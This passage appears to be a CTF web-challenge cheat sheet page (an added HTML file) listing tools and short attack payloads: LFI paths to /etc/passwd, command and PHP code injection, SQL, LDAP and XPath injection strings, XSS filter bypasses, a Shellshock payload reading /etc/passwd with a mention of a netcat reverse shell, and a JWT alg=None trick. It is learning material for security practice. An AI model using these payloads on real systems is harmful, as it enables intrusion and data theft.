+<p>There are tones of tool you can use like <a href="https://github.com/sullo/nikto">nikto</a> or <a href="https://portswigger.net/burp">Burp</a> or <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a> and many more. But Web challenges are not about tools atleast not until you know what the hell is supposed to be done.</p>
+<p>As the great @Corb3nik of <a href="https://opentoallctf.github.io/">OTA</a> said <code>If there is one thing that I've learned from doing CTFs, it's that vulnerability scanners and automated tools such as (SQLMap, Nmap, ...) are rarely the solution.</code></p>
+<p>Like if a form is provided then randomly running sqlmap won't give you anything(it may, sometimes but not the ideal way to do stuff). But still you need tools, for the time when you know what is to be done like sometime you need to enumerate at that point you can use burp repeater or write few lines of python code.</p>
+<p>Some good and most used tools are:</p>
+<p>1) Burp</p>
+<ul>
+<li><a href="https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Pentesting%20With%20Burp%20Suite.pdf">Cheatsheet</a></li>
+<li><a href="https://support.portswigger.net/customer/portal/articles/1969845-using-burp-to-test-for-the-owasp-top-ten">Guide</a></li>
+</ul>
+<p>2) nmap</p>
+<ul>
+<li><a href="https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf">Cheatsheet</a></li>
+<li><a href="https://www.stationx.net/nmap-cheat-sheet/">Cheatsheet</a></li>
+</ul>
+<p>3) Developer tools</p>
+<p>They can be really useful. I have solved lot of challenges just using the firefox dev tool.</p>
+<p>4) Python</p>
+<p>Or any other scripting language you are comfortable with. I mean sometime for enumeration you might need simple script like in <a href="https://ctftime.org/task/7567">evlzctf/enumerate</a> all you need was to send the request to a given link with some weird char so it's just best to write some line of code(unless you are fan of burp :smirk:)</p>
+<p>5) <a href="https://tools.kali.org/web-applications/dirb">dirb</a></p>
+<p>You can also use <a href="https://github.com/maurosoria/dirsearch">dirsearch</a> or any other similar tool. They can be helpful sometime.</p>
+<p>6) wget/curl/httpie</p>
+<p>I use <a href="https://github.com/jakubroztocil/httpie">httpie</a> mostly but most people use curl maybe because it's default or maybe they are not aware of httpie but it totally depends on you, use the one that comforts you.</p>
+<p><a href="https://devhints.io/httpie">httpie-cheatsheet</a> <a href="https://devhints.io/curl">curl-cheatsheet</a></p>
+<h2 id="robots">Robots</h2>
+<p>If the name or the description of the challenge have the word <code>robots</code> or <code>robot</code> or something like <code>Even google can't find up</code> or <code>prevents google scraping it</code>, well just run for the <code>robots.txt</code> file.</p>
+<p>What is robots.txt? - <a href="https://moz.com/learn/seo/robotstxt">https://moz.com/learn/seo/robotstxt</a></p>
+<p>This file might have some link, so you can visit those links and get the flag or maybe the next part of the challenge.</p>
+<h2 id="cookies">Cookies</h2>
+<p>Well if something hints you about the cookie then obviously you should look into cookie. Most of the time you have to change the values or add some values. Like if the challenge says that only admin can see something then see if there is any value something like <code>admin=False</code> or <code>admin=1</code> if yes then make them <code>admin=True</code> or <code>admin=0</code> if no then try adding the latter values in headers.</p>
+<p>Cookies can also have something like md5 hash so you might have to crack it to see what exactly is there, is it some bogus stuff or string that make sense.</p>
+<p>If it's base64 then also try to make sense out of it.</p>
+<h2 id="php-code">PHP code</h2>
+<p>Sometime it happens that you are given a PHP code and you have to give some specific input in parameter to get the flag so you must look out for <a href="http://php.net/manual/en/types.comparisons.php">loose comparision</a>, also see what all kind of <code>param</code> it is accepting and is it possible to exploit them. Look out of something like <code>strcmp</code> and you can try to exploit it like <a href="https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016">this</a></p>
+<p>Read <a href="https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf">PHP magic tricks</a> for more</p>
+<h2 id="sqli">SQLi</h2>
+<p>I am not good in SQLi but most of the time [OWASP](<a href="https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005">https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005</a>)) have really have helped me in figuring out.</p>
+<h2 id="lfirfi">LFI/RFI</h2>
+<p>LFI is <a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion">Local file inclusion</a> which basically allow us to include a file.</p>
+<p>Most common are</p>
+<ul>
+<li><code>?page=../../../../etc/passwd</code> or <code>?page=../../../../flag</code></li>
+<li>Name of the file could be anything</li>
+<li><code>?page=....//....//....//....//etc/passwd</code></li>
+<li>This might sometimes work if the application removes ../ from the url.</li>
+</ul>
+<p>RFI is <a href="https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion">Remote file inclusion</a>, allows you to include file from other server.</p>
+<pre><code class="language-text">?page=http://remote-file.js
+</code></pre>
+<p>The url could be anything maybe the link to the same server or maybe you'll have to upload your payload somewhere else and then try to include the payload file. You'll have to figure that out yourself :smile:</p>
+<h2 id="command-injection">Command Injection</h2>
+<p>Attack that let you execute command like <code>ls</code> or <code>cat</code> and display the content of directories and files.</p>
+<p>Read <a href="https://www.owasp.org/index.php/Command_Injection">Owasp command injection</a></p>
+<p>Sometime you can <code>?exec=;ls;</code> and this will display a list of file.</p>
+<p><strong>Why</strong> <code>;ls;</code> <strong>and not</strong> <code>ls</code><strong>?</strong> Well this actually depends on the challenge whether it allow normal <code>ls</code> or not but for information <code>;ls;</code> command will stop any command in already execution with the first <code>;</code> and then run our command <code>ls</code> and then stop that with last <code>;</code>(it's bash code)</p>
+<p>There's lot of type of command injection like <code>exec</code> or <code>system</code> but you'll have to figure out what it is exactly.</p>
+<p><a href="https://grosquildu.github.io/pentests/web/">https://grosquildu.github.io/pentests/web/</a> <a href="https://grosquildu.github.io/pentests/mobile/">https://grosquildu.github.io/pentests/mobile/</a> <a href="https://grosquildu.github.io/pentests/exp/">https://grosquildu.github.io/pentests/exp/</a></p>
+<h2 id="xss">XSS</h2>
+<p>XSS is the new <code>cool</code> topic for web challenges these days but I am not very good at this since I haven't done these type of challenges.</p>
+<p>But I've done some small XSS on HTB/wizardlabs and following are my go to guides:</p>
+<p>1) <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">Owasp cheatsheet</a></p>
+<p>2) <a href="https://github.com/Anonyme1396/security-tips/blob/master/xss.md">XSS notes</a></p>
+<h2 id="misc">Misc</h2>
+<ul>
+<li>
+<p>We can assing a proper shell to mysql instead of just /bin/false</p>
+<ul>
+<li>/var/lib/mysql/mysql/user.MYD -- this store hashes to root password</li>
+</ul>
+</li>
+<li>
+<p>For PHP <code>usort</code> we need to end with <code>}</code> in RCE.</p>
+<ul>
+<li><em>?order=id);}system('uname -a');//</em></li>
+</ul>
+</li>
+<li>
+<p>Break a web application with simple symbols like <code>'</code> or <code>"</code></p>
+<ul>
+<li>Then try to figure out the correct way to use those<ul>
+<li>after that move on with your RCE payload</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>In python if we import using a magic function then we can directly use the functions.</p>
+<ul>
+<li>Ex: <code>__import__('os').system('ls')</code></li>
+<li>Ex: <code>__import__('base64').b64decode('')</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="ldap">LDAP</h2>
+<ul>
+<li>For LDAP login:<ul>
+<li><code>hacker)(cn=*))%00</code><ul>
+<li>cn=* - This is the true condition for CN</li>
+</ul>
+</li>
+<li>With this we can login as <code>hacker</code> using any password.</li>
+</ul>
+</li>
+</ul>
+<h2 id="sqli_1">SQLi</h2>
+<ul>
+<li>
+<p>The basic one is the <code>' OR 1=1 --</code> or <code>' OR 1=1 #</code></p>
+<ul>
+<li>Single quote can also be replaced with double qoutes.</li>
+</ul>
+</li>
+<li>
+<p>If error like <code>more then one account found</code> or something similar then try to use <code>LIMIT</code></p>
+<ul>
+<li><code>' OR 1=1 LIMIT 1 #</code> - This limit the output to 1</li>
+</ul>
+</li>
+<li>
+<p>Also sometimes replacing <code>OR</code> with <code>||</code> might also help.</p>
+</li>
+<li>
+<p>If Character set is GBK then we can use <code>%bf%27 OR 1=1 --</code></p>
+<ul>
+<li>This is because the <code>'</code> get escaped due to <code>%bf</code></li>
+</ul>
+</li>
+<li>
+<p>You can use <code>union</code> to find the number of columns.</p>
+<ul>
+<li>EX: ?id=1 union select 1,2,3<ul>
+<li>Continue adding a new number until you stop getting an error.</li>
+</ul>
+</li>
+<li>This can further be exploited by checking if any of those columns are directly reflected on the page.<ul>
+<li>change those simple 1,2,3 to something absurd(much easier to find in a page)</li>
+</ul>
+</li>
+<li>same parameter can be used to find out version used and finding db name, table name etc</li>
+</ul>
+</li>
+</ul>
+<h2 id="xml">XML</h2>
+<ul>
+<li>XPath<ul>
+<li>Injecting a single <code>'</code> might result in the error.</li>
+<li>And if it shows XPath then you can try fix the error issue by:<ul>
+<li><code>]%00</code> - sqaure brackets with the null byte</li>
+</ul>
+</li>
+<li><code>/parent::*</code> - get all the parent node</li>
+<li><code>/child::node()</code> - give child and it's node value</li>
+<li>combine both to get key and values both</li>
+</ul>
+</li>
+</ul>
+<h2 id="xssalert1">XSS"//alert(1)</h2>
+<ul>
+<li>To be able to bypass <code>&lt;script&gt;</code> we can use something like <code>&lt;sCRipt&gt;</code></li>
+<li>Sometimes you might notice that the URL is ignoring/replacing <code>&lt;script&gt;</code> with empty values this can be used to get the same thing:<ul>
+<li><code>hacker&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/sc&lt;/script&gt;ript&gt;</code></li>
+</ul>
+</li>
+<li><code>'</code> can really make a difference. <code>alert(1)</code> might work but <code>'alert('1')'</code> might not. So make sure to use quotes properly.</li>
+<li>If an input gets echoed then injecting some random js code something like <code>";var a"</code></li>
+</ul>
+<h2 id="shellshock">Shellshock</h2>
+<p>So <code>/cgi-bin/status</code> or shellshock with CGI basically works because of the issue in the parsing of bash shell.</p>
+<p>Using payloads like:</p>
+<pre><code>() { :; }; echo &quot;NS:&quot; $(&lt;/etc/passwd)
+</code></pre>
+<p>we can read the /etc/passwd file or some other file and even run other commands like <code>nc</code> to get reverse shell.</p>
+<h2 id="jwt">JWT</h2>
+<p>Sometimes you don't have to find the write secret key to be able hack via JWT.
+The last part is the one that is encrypted with the key so for once you can try to remove the last section and make the <code>Alg</code> used to <code>None</code>. This mean there doesn't have to be any kind of encyrption in place and then you can try to login as admin.</p>
+
+              
+            </article>
+            
+          </div>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../tools/" class="md-footer__link md-footer__link--prev" aria-label="Previous: tools" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              tools
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../../VM/Make_boot2root_VM/" class="md-footer__link md-footer__link--next" aria-label="Next: General" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              General
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../..", "features": ["header.autohide"], "search": "../../assets/javascripts/workers/search.b97dbffb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.0238f547.min.js"></script>
+      
+    
+  </body>
+</html>
